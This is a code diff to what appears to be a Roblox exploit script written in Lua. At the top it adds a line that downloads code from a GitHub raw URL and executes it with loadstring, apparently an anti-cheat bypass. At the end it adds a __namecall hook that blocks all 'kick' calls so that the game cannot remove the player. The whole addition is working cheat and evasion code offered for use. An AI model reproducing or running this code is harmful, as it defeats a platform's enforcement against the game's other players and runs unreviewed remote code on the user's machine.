@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua",true))()
+
 local functions = {
     rconsoleprint,
     print,
@@ -47,3 +49,13 @@ setmetatable(
         end
     }
 )
+
+local Players, StarterGui, OldNamecall = game:GetService("Players"), game:GetService("StarterGui")
+
+OldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(...)
+    if (not checkcaller() or true) and string.lower(getnamecallmethod()) == "kick" then
+        return nil
+    end
+
+    return OldNamecall(...)
+end))
